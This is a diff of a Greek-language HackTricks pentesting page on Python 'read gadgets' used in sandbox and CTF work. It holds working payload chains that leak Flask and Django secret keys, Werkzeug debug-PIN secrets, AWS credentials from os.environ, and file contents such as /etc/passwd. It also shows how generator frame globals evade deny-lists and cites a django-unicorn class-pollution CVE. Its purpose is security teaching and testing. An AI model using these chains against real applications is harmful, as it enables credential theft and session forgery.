@@ -1,83 +1,106 @@
-# Python Εσωτερικά Gadgets Ανάγνωσης
+# Gadgets εσωτερικής ανάγνωσης Python
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Βασικές Πληροφορίες
+## Βασικές πληροφορίες
 
-Διάφορες ευπάθειες όπως οι [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ή [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) μπορεί να σας επιτρέψουν να διαβάσετε εσωτερικά δεδομένα της Python αλλά δεν θα σας επιτρέψουν να εκτελέσετε κώδικα. Επομένως, ένας pentester θα χρειαστεί να αξιοποιήσει στο έπακρο αυτά τα δικαιώματα ανάγνωσης για να αποκτήσει ευαίσθητα προνόμια και να κλιμακώσει την ευπάθεια.
+Διαφορερα είδη vulnerabilities, όπως τα [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) ή το [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), ενδέχεται να σας επιτρέψουν να **διαβάσετε εσωτερικά δεδομένα της Python, αλλά δεν θα σας επιτρέψουν να εκτελέσετε κώδικα**. Επομένως, ένας pentester θα πρέπει να αξιοποιήσει στο έπακρο αυτά τα δικαιώματα ανάγνωσης, ώστε να **αποκτήσει ευαίσθητα δικαιώματα και να κλιμακώσει το vulnerability**.
 
-### Flask - Read secret key
+### Flask - Ανάγνωση secret key
 
-Η κύρια σελίδα μιας εφαρμογής Flask πιθανότατα θα έχει το παγκόσμιο αντικείμενο **`app`** όπου αυτό το **μυστικό είναι διαμορφωμένο**.
+Η κύρια σελίδα μιας εφαρμογής Flask πιθανότατα θα περιέχει το **`app`** global object, όπου έχει ρυθμιστεί αυτό το **secret**.
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-Σε αυτή την περίπτωση μπορείτε να αποκτήσετε πρόσβαση σε αυτό το αντικείμενο απλώς χρησιμοποιώντας οποιοδήποτε gadget για να **αποκτήσετε πρόσβαση στα global objects** από τη [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).
+Σε αυτή την περίπτωση είναι δυνατή η πρόσβαση σε αυτό το object χρησιμοποιώντας οποιοδήποτε gadget για **access global objects** από τη σελίδα [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).
 
-Στην περίπτωση που **η ευπάθεια βρίσκεται σε διαφορετικό python αρχείο**, χρειάζεστε ένα gadget για να διασχίσετε τα αρχεία και να φτάσετε στο κύριο ώστε να **προσπελάσετε το global αντικείμενο `app.secret_key`** για να αλλάξετε το Flask secret key και να μπορείτε να [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+Στην περίπτωση όπου **η ευπάθεια βρίσκεται σε διαφορετικό python file**, χρειάζεστε ένα gadget για την περιήγηση στα αρχεία, ώστε να φτάσετε στο κύριο αρχείο και να **access το global object `app.secret_key`**, έχοντας τη δυνατότητα να [**κάνετε escalate privileges** γνωρίζοντας αυτό το key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-Ένα payload σαν αυτό [from this writeup](https://ctftime.org/writeup/36082):
+Ένα payload όπως αυτό [από αυτό το writeup](https://ctftime.org/writeup/36082):
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-Χρησιμοποίησε αυτό το payload για να **αλλάξεις `app.secret_key`** (το όνομα στην εφαρμογή σου μπορεί να είναι διαφορετικό) ώστε να μπορείς να υπογράφεις νέα και πιο προνομιακά flask cookies.
+Χρησιμοποιήστε αυτό το payload για να **διαβάσετε το `app.secret_key`**. Αν το αρχικό bug σάς δίνει επίσης ένα write primitive (για παράδειγμα, class pollution), η ίδια διαδρομή μπορεί να χρησιμοποιηθεί για την αντικατάστασή του και την υπογραφή cookies του Flask με περισσότερα δικαιώματα.
 
 ### Werkzeug - machine_id και node uuid
 
-[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) θα μπορέσεις να αποκτήσεις πρόσβαση στο **machine_id** και στον κόμβο **uuid**, που είναι τα **main secrets** που χρειάζεσαι για να [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) το οποίο μπορείς να χρησιμοποιήσεις για να αποκτήσεις πρόσβαση στο python console στο `/console` αν το **debug mode** είναι ενεργοποιημένο:
+[**Χρησιμοποιώντας αυτά τα payload από αυτό το writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) θα μπορέσετε να αποκτήσετε πρόσβαση στο **machine_id** και στο **uuid** node, τα οποία είναι τα **private bits** που χρειάζεστε για να [**generate το Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) και να αποκτήσετε πρόσβαση στην Python console στο `/console`, αν το **debug mode είναι ενεργοποιημένο**:
 ```python
 {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
 {ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
 ```
 > [!WARNING]
-> Σημειώστε ότι μπορείτε να πάρετε την **τοπική διαδρομή του server προς το `app.py`** προκαλώντας κάποιο **σφάλμα** στη σελίδα web το οποίο θα **σας δώσει τη διαδρομή**.
+> Σημειώστε ότι μπορείτε να λάβετε το **τοπικό path του server προς το `app.py`**, δημιουργώντας κάποιο **error** στη web page, το οποίο θα **σας δώσει το path**.
 
-Αν η ευπάθεια βρίσκεται σε διαφορετικό αρχείο python, δείτε το προηγούμενο κόλπο του Flask για να αποκτήσετε πρόσβαση στα αντικείμενα από το κύριο αρχείο python.
+Αν το vulnerability βρίσκεται σε διαφορετικό python file, ελέγξτε το προηγούμενο Flask trick για να αποκτήσετε πρόσβαση στα objects από το κύριο python file.
 
-### Django - SECRET_KEY and settings module
+### Django - SECRET_KEY και settings module
 
-Το αντικείμενο settings του Django αποθηκεύεται στο `sys.modules` μόλις ξεκινήσει η εφαρμογή. Με μόνο δυνατότητες ανάγνωσης μπορείτε να leak το **`SECRET_KEY`**, τα διαπιστευτήρια της βάσης δεδομένων ή τα signing salts:
+Το Django settings object αποθηκεύεται σε cache στο `sys.modules` μόλις ξεκινήσει η application. Με μόνο read primitives μπορείτε να κάνετε leak το **`SECRET_KEY`**, τα fallback keys, τα database credentials ή τα signing salts:
 ```python
 # When DJANGO_SETTINGS_MODULE is set (usual case)
 sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY
 
 # Through the global settings proxy
 a = sys.modules['django.conf'].settings
-(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
+(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
+a.SESSION_ENGINE, a.SESSION_SERIALIZER)
 ```
-Αν το ευάλωτο gadget βρίσκεται σε άλλο module, διατρέξτε πρώτα τα globals:
+Αν το ευάλωτο gadget βρίσκεται σε άλλο module, περιηγηθείτε πρώτα στα globals:
 ```python
 __init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
 ```
-Μόλις το κλειδί γίνει γνωστό μπορείτε να πλαστογραφήσετε Django signed cookies ή tokens με παρόμοιο τρόπο όπως στο Flask.
+`SECRET_KEY_FALLBACKS` είναι εξίσου πολύτιμα με το τρέχον `SECRET_KEY`: εξακολουθούν να επικυρώνουν παλιές signed values κατά την rotation. Επίσης, κάντε leak τα `SESSION_ENGINE` και `SESSION_SERIALIZER` για να προσδιορίσετε γρήγορα αν το impact περιορίζεται σε cookie forgery ή αν είναι κάτι ισχυρότερο. Για λεπτομέρειες σχετικά με το web impact, δείτε τη σελίδα [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).
 
-### Μεταβλητές περιβάλλοντος / cloud creds μέσω φορτωμένων modules
+### Module loader gadgets - ανάγνωση source code και αρχείων
 
-Πολλά jails εξακολουθούν να εισάγουν `os` ή `sys` κάπου. Μπορείτε να καταχραστείτε οποιαδήποτε προσβάσιμη συνάρτηση `__init__.__globals__` για να pivot στο ήδη εισαχθέν `os` module και να dump **environment variables** που περιέχουν API tokens, cloud keys ή flags:
+Τα loaded Python modules συνήθως διατηρούν ένα `__loader__`. Οι file-backed loaders συχνά εκθέτουν τα `get_source()` και `get_data()`, τα οποία είναι ιδανικά **read-only primitives** όταν μπορείτε ήδη να αποκτήσετε πρόσβαση σε ένα module object, αλλά όχι στη `open()`:
+```python
+m = __init__.__globals__['sys'].modules['__main__']
+m.__loader__.get_source(m.__name__)   # source of app.py / __main__
+m.__loader__.get_data(m.__file__)     # raw bytes of the same file
+```
+Αυτό είναι πολύ χρήσιμο για να κάνετε dump σε **config modules, blueprints, helper files ή hidden routes** και να ανακτήσετε API keys, DSNs, flag paths ή επιπλέον gadget entry points.
+
+Αν έχετε μόνο subclass enumeration, αναζητήστε τον loader με βάση το όνομα αντί να κάνετε hard-code ένα index:
+```python
+# unbound call: first argument acts as a dummy self
+[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
+```
+### Globals του frame των generator / coroutine
+
+Αν μπορείς να δημιουργήσεις ή να προσεγγίσεις ένα αντικείμενο generator/coroutine, το frame του μπορεί να κάνει leak τα globals **χωρίς να χρειάζεται κανένα gadget `__globals__` συνάρτησης**. Αυτό είναι χρήσιμο απέναντι σε φίλτρα που μπλοκάρουν μόνο ονόματα dunder και ξεχνούν attributes του frame, όπως `gi_frame`, `ag_frame`, `cr_frame` ή `f_globals`:
+```python
+(_ for _ in ()).gi_frame.f_globals['__builtins__']
+(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
+```
+Μόλις αποκτήσετε τα frame globals, συνεχίστε ακριβώς όπως και στα άλλα gadgets (`sys.modules`, settings objects, `os.environ`, κ.λπ.). Τα πρόσφατα sandbox escapes το ανακαλύπτουν ξανά και ξανά, επειδή τα `gi_frame` και `f_globals` δεν είναι dunder attributes και συχνά επιβιώνουν από naive deny-lists.
+
+### Environment variables / cloud creds μέσω loaded modules
+
+Πολλά jails εξακολουθούν να κάνουν import τα `os` ή `sys` κάπου. Μπορείτε να κάνετε abuse οποιασδήποτε προσβάσιμης συνάρτησης `__init__.__globals__`, ώστε να μεταβείτε στο ήδη imported module `os` και να κάνετε dump των **environment variables** που περιέχουν API tokens, cloud keys ή flags:
 ```python
 # Classic os._wrap_close subclass index may change per version
 cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
 cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
 ```
-Αν ο δείκτης υποκλάσης είναι φιλτραρισμένος, χρησιμοποίησε loaders:
+Αν το index της subclass φιλτράρεται, χρησιμοποιήστε loaders:
 ```python
 __loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
 ```
-Οι μεταβλητές περιβάλλοντος είναι συχνά τα μόνα μυστικά που απαιτούνται για να μεταβείτε από ανάγνωση σε πλήρη συμβιβασμό (cloud IAM keys, database URLs, signing keys, etc.).
+Οι μεταβλητές περιβάλλοντος είναι συχνά τα μόνα secrets που απαιτούνται για τη μετάβαση από read σε πλήρη παραβίαση (cloud IAM keys, database URLs, signing keys κ.λπ.).
 
 ### Django-Unicorn class pollution (CVE-2025-24370)
 
-`django-unicorn` (<0.62.0) επέτρεπε **class pollution** μέσω ειδικά διαμορφωμένων αιτημάτων component. Η ρύθμιση μιας διαδρομής ιδιότητας όπως `__init__.__globals__` επέτρεπε σε έναν επιτιθέμενο να προσεγγίσει τα globals του module του component και οποιαδήποτε εισαχθέντα modules (π.χ. `settings`, `os`, `sys`). Από εκεί μπορείτε να leak `SECRET_KEY`, `DATABASES` ή διαπιστευτήρια υπηρεσιών χωρίς εκτέλεση κώδικα. Η αλυσίδα εκμετάλλευσης είναι καθαρά βασισμένη στην ανάγνωση και χρησιμοποιεί τα ίδια dunder-gadget μοτίβα όπως παραπάνω.
+Το `django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) επέτρεπε **class pollution** μέσω ειδικά διαμορφωμένων component requests. Ο ορισμός ενός property path όπως το `__init__.__globals__` έδινε στον attacker πρόσβαση στα globals του component module και σε οποιαδήποτε imported modules (π.χ. `settings`, `os`, `sys`). Από εκεί μπορείτε να κάνετε leak των `SECRET_KEY`, `DATABASES` ή service credentials χωρίς code execution. Το exploit chain βασίζεται αποκλειστικά σε read και χρησιμοποιεί τα ίδια dunder-gadget patterns όπως παραπάνω.
 
 ### Gadget collections for chaining
 
-Πρόσφατα CTFs (π.χ. jailCTF 2025) δείχνουν αξιόπιστες αλυσίδες ανάγνωσης κατασκευασμένες μόνο με πρόσβαση σε ιδιότητες και απαρίθμηση υποκλάσεων. Λίστες που διατηρούνται από την κοινότητα όπως [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) καταγράφουν εκατοντάδες ελάχιστα gadgets που μπορείτε να συνδυάσετε για να μεταβείτε από αντικείμενα σε `__globals__`, `sys.modules` και τελικά σε ευαίσθητα δεδομένα. Χρησιμοποιήστε τα για γρήγορη προσαρμογή όταν δείκτες ή ονόματα κλάσεων διαφέρουν μεταξύ μικρών εκδόσεων του Python.
-
-
+Πρόσφατα CTFs και έρευνα σε pyjail δείχνουν αξιόπιστα read chains που δημιουργούνται αποκλειστικά με attribute access και subclass enumeration. Community-maintained λίστες όπως το [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) καταγράφουν εκατοντάδες minimal gadgets που μπορείτε να συνδυάσετε για να περιηγηθείτε από objects στα `__globals__`, `sys.modules` και τελικά σε sensitive data. Προτιμήστε searches που βασίζονται σε attributes/names αντί για raw subclass indexes, επειδή η θέση των `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` κ.λπ. αλλάζει μεταξύ εκδόσεων της Python και ανάλογα με τα επιπλέον imported libraries.
 
 ## References
 
-- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
+- [Django documentation για cryptographic signing](https://docs.djangoproject.com/en/6.0/topics/signing/)
 - [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
 {{#include ../../banners/hacktricks-training.md}}
